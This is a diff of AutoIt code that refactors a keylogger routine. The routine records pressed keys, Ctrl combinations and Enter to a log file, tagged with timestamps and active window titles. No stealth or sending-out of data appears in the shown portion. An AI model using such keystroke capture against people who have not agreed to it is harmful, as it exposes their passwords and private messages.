@@ -16,10 +16,6 @@ Func _isKeyReleased( $sKeyHexCode )
     Return False
 EndFunc
 
-Func _wasKeyPressed( $sKeyHexCode )
-    Return _isKeyReleased( $sKeyHexCode )
-EndFunc
-
 Func _hasWindowChanged( $sWindow )
     If $sWindow == $sCurrentWindow Then Return False
     $sCurrentWindow = $sWindow
@@ -28,31 +24,33 @@ Func _hasWindowChanged( $sWindow )
 EndFunc
 
 Func _wasKeyOfKeyTypePressed( $aKeyType, $iMode = 0 )
-    For $i = 0 To UBound( $aKeyType ) - 1 Step 1
+    Local $iCountOfKeys = UBound( $aKeyType ) - 1
+
+    For $i = 0 To $iCountOfKeys Step 1
         Local $sKeyHexCode = $aKeyType[$i][0]
         Local $sKey        = $aKeyType[$i][1]
 
-        If _wasKeyPressed( $sKeyHexCode ) Then
+        If Not _isKeyReleased( $sKeyHexCode ) Then
+            ContinueLoop
+        Else
             Local $sTimestamp   = @YEAR & '-' & @MON & '-' & @MDAY & ' ' & @HOUR & ':' & @MIN & ':' & @SEC & '.' & @MSEC
             Local $sActivWindow = WinGetTitle( '[ACTIVE]' )
             Local $sBlockEnd    = @CRLF & '```' & @CRLF & @CRLF
             Local $sBlockStart  = @CRLF & @CRLF & '```' & @CRLF
             Local $sTextBlock   = $sBlockEnd & '##### **' & $sTimestamp & '**' & @CRLF & '###### &raquo; ' & $sActivWindow & $sBlockStart
+            Local $sEnterKey    = '0D'
 
-            ; Enter
-            If $sKeyHexCode == '0D' Then FileWrite( $hLogFile, @CRLF )
+            If $sKeyHexCode == $sEnterKey Then FileWrite( $hLogFile, @CRLF )
+            If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
 
             Switch $iMode
                 Case 1
-                    If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                     FileWrite( $hLogFile, StringUpper( $sKey ) )
 
                 Case 2
-                    If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
-                    FileWrite( $hLogFile, '[Ctrl]+[' & $sKey & ']')
+                    FileWrite( $hLogFile, '[Ctrl]+[' & $sKey & ']' )
 
                 Case Else
-                    If _hasWindowChanged( $sActivWindow ) Then FileWrite( $hLogFile, $sTextBlock )
                     FileWrite( $hLogFile, $sKey )
             EndSwitch
         EndIf
